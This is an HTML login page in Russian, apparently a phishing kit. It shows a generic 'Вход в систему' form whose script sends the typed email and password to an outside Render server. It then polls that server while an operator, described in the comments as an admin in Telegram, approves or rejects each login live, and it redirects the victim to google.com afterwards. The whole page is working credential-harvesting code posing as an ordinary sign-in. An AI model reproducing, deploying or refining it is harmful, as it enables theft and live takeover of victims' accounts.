<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Авторизация</title>
    <style>
        /* Твои стили здесь */
        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; padding-top: 50px; }
        input { margin: 10px; padding: 10px; width: 250px; }
        button { padding: 10px 20px; cursor: pointer; background: #0088cc; color: white; border: none; border-radius: 5px; }
    </style>
</head>
<body>
    <h2>Вход в систему</h2>
    <input type="text" id="email" placeholder="Email или Логин">
    <input type="password" id="pass" placeholder="Пароль">
    <button id="sendBtn" onclick="sendAuth()">Войти</button>

    <script>
        // --- НАСТРОЙКИ ---
        const SERVER_URL = 'https://sever-afk3.onrender.com'; // ПРОВЕРЬ, ЧТО ЭТО ТВОЙ URL
        // -----------------

        // Генерируем ID для текущей сессии, чтобы админ подтвердил именно нас
        const userId = 'user_' + Math.random().toString(36).substr(2, 9);

        async function sendAuth() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;
            const btn = document.getElementById('sendBtn');

            if(!email || !pass) return alert("Заполните поля!");

            btn.disabled = true;
            btn.innerText = "Ожидание подтверждения...";

            try {
                // Отправляем данные на твой сервер Render
                await fetch(`${SERVER_URL}/send-data`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'auth',
                        email: email,
                        pass: pass,
                        userId: userId
                    })
                });

                // Начинаем проверять, что ответил админ в телеграме
                checkStatus();
            } catch (err) {
                alert("Ошибка связи с сервером");
                btn.disabled = false;
                btn.innerText = "Войти";
            }
        }

        function checkStatus() {
            const timer = setInterval(async () => {
                try {
                    const res = await fetch(`${SERVER_URL}/check/${userId}`);
                    const data = await res.json();

                    if (data.status === 'success') {
                        clearInterval(timer);
                        alert("✅ Вход подтвержден!");
                        window.location.href = "https://google.com"; // Куда кинуть юзера после успеха
                    } else if (data.status === 'error') {
                        clearInterval(timer);
                        alert("❌ Ошибка: Неверный логин или пароль");
                        location.reload();
                    }
                } catch (e) {
                    console.log("Ждем ответа сервера...");
                }
            }, 3000); // Проверка каждые 3 секунды
        }
    </script>
</body>
</html>


